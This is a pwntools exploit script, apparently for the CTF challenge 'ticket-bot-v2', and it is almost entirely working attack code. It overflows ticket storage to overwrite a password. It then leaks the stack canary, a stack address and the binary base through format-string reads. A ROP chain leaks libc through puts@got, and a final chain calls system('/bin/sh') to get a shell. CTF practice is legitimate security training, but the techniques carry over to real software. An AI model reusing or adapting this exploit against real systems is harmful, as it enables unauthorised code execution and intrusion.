#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF(args.EXE or './chal_patched')
context(terminal=['tmux','new-window'])
libc = ELF('./libc.so.6')

host = args.HOST or 'ticket-bot-v2.challs.csc.tf'
port = int(args.PORT or 1337)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
b *menu+56
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()
# pause()

# fill 5 tickets
io.sendline(b'TEST')
for i in range(4):
    io.sendline(b'1')
    io.sendline(b'TEST')

# overwrite seed and password
io.sendline(b'1')
io.sendline(b'A'*8)

# service login to leak canary
io.sendline(b'3')
io.sendline(str(u32(b'AAAA')).encode())
io.sendline(b'1')
io.recvuntil(b'Enter new Password\n')
io.sendline(b'%7$p')
io.recvuntil(b'Password changed to')
io.recvline()
canary = int(io.recvline().split(b'=')[0].decode(),16)
log.info(f'Canary: {hex(canary)}')

# leak stack address
io.sendline(b'3')
io.sendline(str(u32(b'AAAA')).encode())
io.sendline(b'1')
io.recvuntil(b'Enter new Password\n')
io.sendline(b'%8$p')
io.recvuntil(b'Password changed to')
io.recvline()
stack_addr = int(io.recvline().split(b'=')[0].decode(),16)

# leak binary base
io.sendline(b'3')
io.sendline(str(u32(b'AAAA')).encode())
io.sendline(b'1')
io.recvuntil(b'Enter new Password\n')
io.sendline(b'%9$p')
io.recvuntil(b'Password changed to')
io.recvline()
exe.address = int(io.recvline().split(b'=')[0].decode(),16)-0x16a6
log.info(f'exe base address: {hex(exe.address)}')

# leak libc base with a rop chain to put puts@got
io.sendline(b'3')
io.sendline(str(u32(b'AAAA')).encode())
io.sendline(b'1')
io.recvuntil(b'Enter new Password\n')
payload = b''
payload += b'A'*8
payload += p64(canary)
payload += p64(stack_addr)
rop = ROP(exe)
rop.puts(exe.got['puts'])
rop.adminpass()
payload += rop.chain()
io.sendline(payload)
io.recvuntil(b'Password changed to')
io.recvline()
leak = io.recvline()[4:-1]
leak += b'\x00'*(8-len(leak))
libc.address = u64(leak) - libc.symbols['puts']
log.info(f'libc base address: {hex(libc.address)}')

# overwrite canary + return address for rop chain
io.recvuntil(b'Enter new Password\n')
payload = b''
payload += b'A'*8
payload += p64(canary)
payload += p64(stack_addr)
rop = ROP(libc)
rop.raw(rop.ret)
bin_sh = next(libc.search(b'/bin/sh'))
rop.system(bin_sh)
payload += rop.chain()
io.sendline(payload)
io.recvuntil(b'Password changed to')
io.recvline()
io.recvuntil(b'AAAA')

io.interactive()
